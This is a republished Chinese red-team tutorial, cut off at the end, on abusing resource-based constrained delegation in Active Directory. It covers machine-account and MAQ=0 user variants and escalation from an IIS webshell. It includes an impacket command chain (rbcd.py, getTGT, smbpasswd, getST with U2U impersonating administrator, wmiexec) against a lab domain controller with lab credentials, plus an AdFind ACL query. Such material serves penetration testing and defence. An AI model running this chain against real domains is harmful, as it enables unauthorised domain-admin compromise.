---
title: 基于资源的约束委派（RBCD）
url: https://www.secpulse.com/archives/194821.html
source: 安全脉搏
date: 2023-01-12
fetch_date: 2025-10-04T03:36:09.587376
---

# 基于资源的约束委派（RBCD）

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 基于资源的约束委派（RBCD）

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-01-11

11,639

## 以下文章来源于红队蓝军 ，作者ziansec

## RBCD

给机器添加RBCD的前提：1.自己能给自己添加 2.ACL→Account Restriction/msDS-AllowedToActOnBehalfOfOtherIdentity属性→creator-sid/backdoor/high level user。如果对计算机对象/域用户具Account Restriction和msDS-AllowedToActOnBehalfOfOtherIdentity属性的WriteProperty，就能进行基于 资源约束委派的利用。

## 简单利用

## 基于资源的约束委派(Computer)

##### 添加

##### 分两种情况：

(1).creator-sid 用户：alice-workstation$由alice拉入域中，则alice默认就具有alice-workstation$的Account Restriction的WriteProperty权限

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426640.png)

(2).拿下域权限后添加bob对alice-workstation$的msDS-AllowedToActOnBehalfOfOtherIdentity的WriteProperty权限 1.ldap\_shell

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426641.png)

2.lex

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426643.png)

adfind对alice-workstation的acl进行查询：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426649.png)

##### 滥用

以bob对alice-workstation$滥用进行演示：

域用户默认能添加 10 台计算机入域(maq)，以bob的身份添加bob-evil$

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426655.png)

设置bob-evil到alice-station$的rbcd

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426656.png)

约束委派生成administrator对alice-station$的cifs ST票据

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426657.png)

导入票据并获得一个wmi的交互式shell

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426658.png)

### 基于资源的约束委派(User)→MAQ=0

##### 前段时间，老外已经研究出了这种利用方式：

https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html 在maq=0的情况下，攻击者无法创建机器账户，可以通过域用户rbcd到域机器账户进行滥用。

#### 添加

跟上面一样，alice-station由alice拉入域中，所以alice具有alice-station$域用户的 \*\*msDS-AllowedToActOnBehalfOfOtherIdentity的 WriteProperty权限。\*\* 设置bob到alice-station$到bob的rbcd：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426661.png)

##### 滥用

getST.py生成administrator对alice-station的cifs ST票据：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426662.png)

在S4U2self阶段报错：Kerberos SessionError:KDC\_ERR\_S\_PRINCIPAL\_UNKNOWN。

这是因为用户默认没有注册SPN，KDC无法选择正确的密钥来解密，所以在S4U2Self才会失败。如果将 SPN 添加到bob就能成功从 KDC申请ST票据，这意味着这不是用户帐户本身的问题，而只是 KDC 无法选择正确密钥进行解密。

U2U实现了用户到用户的身份验证拓展，在S4U2Proxy阶段KDC会尝试使用bob的Long-term key(bob 的hash)进行解密，但U2U会使 用附加到TGS-REQ当中的TGT会话密钥加密之后的票据，KDC无法正常解密。这时可以利用SamrChangePasswordUser在S4U2Self 和S4U2Proxy中间将bob的hash更改成U2U对TGT加密密钥的值，KDC就能成功解密并颁发ST票据。具体可参考：https://mp.weixin.qq.com/s/1eJb-UtSVRV5JF0gfQgwWg

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426664.png)

**impacket利用**

以设置普通域用户dandy基于资源约束委派到dc1$为例，这里直接粗暴利用administrator设置rbcd

```
# 设置dandy到dc1$的RBCD
python3 rbcd.py redteam.lab/administrator:Qq123456.. -action write -delegate-to 'dc1$' -delegate-from 'dandy' -dc-ip 192.168.134.
# 使用dandy的hash生成TGT（ntlm hash使用RC4加密）
getTGT.py -hashes :$(pypykatz crypto nt 'Qq123456..') 'redteam.lab/dandy' -dc-ip 192.168.134.
# 获取dandyTGT的Session Key
python3 describeticket.py dandy.ccache | grep 'Ticket Session Key'
# 将dandy的hash设置为Session Key
python3 smbpasswd.py -newhashes :c592bc40c1908aff4787f4f4db7f0a82 'redteam/dandy:Qq123456..'@dc1.redteam.lab
# 导入TGT
export KRB5CCNAME=dandy.ccache
# 利用u2u获取dc1的host service的ST
python3 getST.py -u2u -impersonate administrator -spn "host/dc1.redteam.lab" -k -no-pass 'redteam.lab/dandy'
# 导入ST
export KRB5CCNAME=administrator@host_dc1.redteam.lab@REDTEAM.LAB.ccache
# WMI
python3 wmiexec.py administrator@dc1.redteam.lab -k -no-pass
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426667.png)

**注：SamrChangePasswordUser受域组策略影响，域内默认且普遍存在密码策略，可能不能做到及时改回密码。如果肯定通过当前 域用户能拿下DC的话可以进行尝试，利用成功后将用户密码改为原来的值。**

## 烂番茄

基于资源的约束委派通过修改自身msDS-AllowedToActOnBehalfOfOtherIdentity字段达到委派的目的，默认把这台域机器拉入域的域 用户有这个权限，还有谁有？因为evil这台机器通过 07 用户拉入域内，通过AdFind遍历evil的ACL，通过write筛选对其具有写权限的用户。

```
AdFind -b "CN=evil,CN=Computers,DC=redteam,DC=lab" -s base nTSecurityDescriptor -sddl++ -resolvesids | findstr "write”
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426670.png)

##### 可以看到不只是 07 这个用户，SYSTEM权限的用户也对这个对象具有写的权限。

#### 攻击面：通过iis等以服务权限起的域用户拿到当前域机器最高权限。

(https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)官方文档中明确表示iis等服务用户以机 器账号(SYSTEM)请求网络资源。官方文档中明确表示iis等服务用户以机器账号(SYSTEM)请求网络资源。)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426672.png)

这样会导致一个非常严重的问题：不止于iis，所有低权限服务(例如network service这类型的本机服务)都是以机器账户身份去请求的 域内资源。利用这一特性可以直接使其连接到域控的ldap设置基于当前机器的基于资源的约束委派，造成当前域机器沦陷。

#### 演示

##### 前面已知：

##### 1. 域内用户默认可以创建十台域机器。

1. 低权限服务(例如network service这类型的本机服务)都是以机器账户身份请求域内资源。

   机器账号对其本身有WriteProperty权限。当前环境：

   在域内域机器web2008上存在iis服务，攻击者拿到webshell后发现当前权限为iis，但是此用户依然是域用户，可以创建机器账 号；

   iis以机器账户请求域内资源，对其机器本身有WriteProperty权限，可以设置自身的msDS-AllowedToActOnBehalfOfOtherIdentity 字段来设置基于资源的约束委派。所以可以利用web2008创建域机器（此处为evilpc），并通过writelproperty设置evilpc到其的基于资源的约束委派。

   ![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194821-1673426673.png)

##### 通过查看LDAP确定是否设置成功

![](https://secpulseo...